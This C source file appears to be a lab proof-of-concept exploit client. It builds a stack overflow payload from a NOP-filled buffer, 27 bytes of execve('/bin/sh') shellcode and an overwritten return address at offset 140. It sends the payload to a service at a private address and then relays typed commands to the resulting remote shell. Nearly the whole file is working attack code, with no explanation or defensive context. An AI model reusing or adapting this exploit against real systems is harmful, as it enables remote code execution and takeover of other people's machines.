#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define DEBUG_ENABLED 1
#define BUFFER_SIZE 256
#define SHELL_CODE_SIZE 27
#define ADDRESS 0x7fffffffe5f0

int clientSocket;

void buildShellMessage(uint8_t *buffer);

int main(int argc, char* argv[]) {
	uint8_t nonPointerBuffer[BUFFER_SIZE];
	uint8_t *buffer = nonPointerBuffer;

	buildShellMessage(buffer);

	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (DEBUG_ENABLED) printf("Socket created\n");

	char destinationIP[] = "192.168.56.103";
	struct sockaddr_in destination;
	memset(&destination,0,sizeof(destination));
	destination.sin_family = AF_INET;
	destination.sin_port = htons(4321);
	inet_pton(AF_INET, destinationIP, &(destination.sin_addr));

	connect(clientSocket, (struct sockaddr*) &destination, sizeof(struct sockaddr_in));
	if (DEBUG_ENABLED) printf("Socket connected to destination\n");

	char receivedBuffer[1000];
	memset(receivedBuffer, 0, 1000);
	int receivedLength = recv(clientSocket, receivedBuffer, 1000, 0); 
	if (DEBUG_ENABLED) {
		printf("Message received : %s\n", receivedBuffer);
	}
	if (receivedLength == -1) printf("ERROR : RECEIVE");

	send(clientSocket, nonPointerBuffer, BUFFER_SIZE, 0);
	if (DEBUG_ENABLED) printf("Message sent\n");

	char terminalCommand[200];
	while (1) {
		memset(terminalCommand, 0, 200);
		fgets(terminalCommand, 200, stdin);
		send(clientSocket, terminalCommand, 256, 0);
	}

	return 0;
};

void buildShellMessage(uint8_t *buffer) {
	memset(buffer, 0x90, BUFFER_SIZE); 

	uint8_t shellCode[SHELL_CODE_SIZE] = { 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05 };

	long returnAddress = ADDRESS;

	memcpy(buffer, shellCode, SHELL_CODE_SIZE);
	memcpy(buffer + 140, &returnAddress, 6);
	*(buffer + 146) = 0x00;
}
